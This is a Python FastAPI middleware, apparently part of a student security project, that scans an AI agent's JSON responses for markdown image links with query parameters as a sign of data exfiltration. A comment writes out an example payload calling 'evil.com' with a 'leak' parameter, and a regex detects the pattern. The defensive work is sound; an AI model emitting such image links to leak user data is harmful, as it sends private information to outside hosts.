import re
from fastapi import Request, Response
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import StreamingResponse

class MarkdownExfiltrationDetector(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        
        # We only need to scan JSON responses from the AI Agent
        content_type = response.headers.get("content-type", "")
        if "application/json" in content_type:
            # Consuming the body from the stream
            body = b""
            async for chunk in response.body_iterator:
                body += chunk
            
            # This regex detects the 'Image Injection' side-channel:
            # Matches: ![any_text](http://evil.com/path?leak=data)
            exfiltration_pattern = r"!\[.*?\]\(https?:\/\/[^\s)]+\?[^\s)]+=[^\s)]+\)"
            
            decoded_body = body.decode(errors="ignore")
            if re.search(exfiltration_pattern, decoded_body, re.DOTALL):
                # In a real GSoC project, you'd log this to a security dashboard
                print("\n🚨 [SECURITY ALERT] Potential Side-Channel Exfiltration Detected!")
                print(f"🚩 Target Pattern Found in Response Body\n")

            # Since we consumed the stream, we must return a new Response object
            return Response(
                content=body,
                status_code=response.status_code,
                headers=dict(response.headers)
            )
            
        return response